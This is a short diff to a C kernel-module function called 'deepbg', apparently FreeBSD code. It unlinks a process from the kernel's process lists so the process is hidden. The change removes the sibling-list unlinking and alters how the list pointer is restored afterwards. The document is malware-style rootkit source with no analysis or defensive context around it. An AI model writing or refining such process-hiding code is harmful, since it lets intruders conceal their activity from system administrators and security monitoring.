@@ -84,7 +84,6 @@ static int deepbg(struct thread *td, void *syscall_args)
 
             /* Remove the process from p_list, p_sibling, and p_hash lists to hide it */
             LIST_REMOVE(p, p_list);
-            LIST_REMOVE(p, p_sibling);
             LIST_REMOVE(p, p_hash);
 
             /*
@@ -100,13 +99,8 @@ static int deepbg(struct thread *td, void *syscall_args)
              * the QMD_LIST_CHECK_PREV check when this process exits.
              */
 
-            if (oldprev != NULL) {
-               p->p_list.le_prev = oldprev;
-            }
-
+            p->p_list.le_prev = oldprev;
             *p->p_list.le_prev = &(*p);
-
-            oldprev = NULL;
             break;
          }
       }
